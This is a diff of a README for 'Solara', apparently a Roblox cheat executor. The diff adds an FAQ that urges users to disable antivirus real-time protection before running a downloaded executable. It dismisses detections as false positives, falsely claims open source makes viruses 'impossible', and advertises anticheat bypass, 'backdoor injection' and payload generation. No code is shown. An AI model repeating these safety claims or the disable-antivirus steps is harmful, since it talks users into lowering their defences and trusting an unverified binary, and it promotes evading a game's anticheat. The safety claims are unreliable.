@@ -8,25 +8,24 @@
 ![Banner](img/Screenshot_2024-06-18-15-58-34-718_com.discord.png)
 
 ## ABOUT!
-Solara is a powerful Roblox exploit developed by expert programmers since 2023. It offers a wide range of advanced features, making it a popular choice among users for its reliability and efficiency. With continuous updates and improvements, Solara remains at the forefront of Roblox exploitation tools.
+Solara is a powerful Roblox Level 3 FOSS (Free and Open Source) exploit tool developed since 2023. It is one of the most popular roblox injectors with the largest exploit community. It is currently **UNDETECTABLE** by Byfron (Roblox Anticheat) and is updated every week.Bug fixes are routinely announced in the server as well as in #CHANGELOGS 
 
-### supporting info!
-- **52% Unc Support**: Benefit from unparalleled support with the Solara Executor.
-- **Free Level 3 Executor**: Access advanced features of the Solara Executor completely free of charge.
 
 ## Features!
 [![Version](https://img.shields.io/badge/Presenting-darkgreen.svg?maxAge=259200)]()
 
-- Bug fixes.
 - Improved bootstrapper.
-- Enhanced backdoor injection.
-- Generate payloads in various formats.
-- Bypassed Byfron.
+- **Enhanced backdoor injection.**
+- **Generate payloads in various formats.**
+- **Bypassed Byfron.**
 - New GUI.
 - Ability to search for updated scripts.
 - Automatically runs injector (configurable in settings).
-- keyless executor.
+- **keyless executor.**
 - ad-free installation guidance.
+- **52% Unc Support**: Benefit from unparalleled support with the Solara Executor.
+- **Free Level 3 Executor**: Access advanced features of the Solara Executor completely free of charge.
+
 
 ## CONSTANT UPDATES!
 Solara is constantly evolving with regular updates, ensuring our users have access to the most efficient executor and latest features for their Roblox exploits.
@@ -53,11 +52,25 @@ First, download the zip file. Next, temporarily disable your antivirus software 
 4. Disable "Real-time protection."
 After that, unzip the file using WinRAR or 7-Zip. 
 
-### last step:
 
-Once extracted, navigate to the files and double-click on Solarabootstrapper.exe. With this, the process is complete.
+### Q&A
 
-Take a look at the source code for more details.
+**Why do I need to disable Antivirus?**
+
+
+**Why do I need to disable AV (Antivirus)**
+
+Windows Defender falsely flags our software due to its functionality. This is common in virtually every single executor existing and defunct such as Krnl,Oxygen U, Kiwi X and much more. All Roblox executors need to inject within the roblox process to hide detection by Roblox anticheat (Byfron). This isn't a 'defect' isolated to Solara. Every single executor existing and defucnt require you to disable AV due to the aforementioned reason. This improper flagging is commonly known as a [False Positive]([url](https://support.avira.com/hc/en-us/articles/360002183358-What-is-a-false-positive-Avira-Antivirus-detection))
+
+> False positives (false alarms) are harmless files or URLs that are incorrectly identified as malicious by the antivirus program. Software programs that behave like malware or use identical file compression and protection techniques are susceptible to false alarms.
+
+_Source: Avira, Awardwinning Information Security research and mitigation company._ 
+
+**is Solara safe?** 
+
+Solara is completely free and open source (**FOSS**) meaning that its source code is **publicablly availble** to read and edit making viruses **IMPOSSIBLE** to obfuscate. It is also the longest continously working exploits since 2023. Solara has the highest up-time out of any major executor and also has the largest user base. Relative to other executors, Solara is the only existing executor that is FOSS.
+
+
 
 ## Contributions to Solara:
 [![Version](https://img.shields.io/badge/Contributers-yellow.svg?maxAge=259200)]()
